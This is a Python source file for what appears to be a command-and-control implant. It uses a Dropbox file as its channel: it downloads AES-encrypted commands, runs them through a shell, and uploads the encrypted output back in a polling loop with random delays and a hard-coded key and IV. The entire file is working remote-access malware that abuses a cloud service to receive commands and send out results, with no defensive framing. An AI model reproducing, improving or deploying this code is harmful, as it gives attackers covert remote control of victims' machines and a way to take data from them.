import dropbox
import subprocess
import time
import random
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad


# Aes-128 Encryption
def encrypt_message(message):
    cipher = AES.new(key, AES.MODE_CBC, IV=CONST_IV)
    ct_bytes = cipher.encrypt(pad(message, AES.block_size))
    return ct_bytes

# Aes-128 bit Decryption
def decrypt_message(ct_bytes):
    cipher = AES.new(key, AES.MODE_CBC, iv=CONST_IV)
    pt = unpad(cipher.decrypt(ct_bytes), AES.block_size)
    return pt.decode()

# Read Command from the the dropbox file

#def read_command(command):
    # while (command == prev_command):
    #     print('[-] No new commands from c2')
    #     n = random.randint(5, 10)
    #     time.sleep(n)
    #     _, response = dbx.files_download(dropbox_path)
    #     command = decrypt_message(response.content)
    
    #excecute(command)

# Execute the command 
def excecute(command):
    print('[+] Successfully read command from payload.txt')
    print(f'command form c2->{command}')
    command = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = command.stdout.read() + command.stderr.read()

    print(f'output->{output}')
    write_output(output)

# Write output back to the dropbox file
def write_output(output):
    prev_output = output
    output = encrypt_message(output)
    dbx.files_upload(output, dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
    print("Response written to payload.txt.")

    check_new_command(prev_output)

def check_new_command(prev_output):
    while True:
        _, response = dbx.files_download(dropbox_path)
        new_command = decrypt_message(response.content)

        #print(f'new-cmd{new_command}, prev_output{prev_output}')

        if (new_command == prev_output.decode()):
            print('[-] No new commands from c2')
            n = random.randint(5,10)
            time.sleep(n)
        
        elif new_command == 'exit':
            break
        else:
            excecute(new_command)



if __name__ == '__main__':
    key = "564cybereffectss".encode()
    CONST_IV = 'qwertyuiopasdfgh'.encode()

    # dropbox init
    with open("token.txt", "r") as f:
        token = f.read()

    dbx = dropbox.Dropbox(token)
    dropbox_path = '/c2/payload.txt'

    prev_command = None
    # start payload execution
    _, response = dbx.files_download(dropbox_path)
    command = decrypt_message(response.content)

    excecute(command)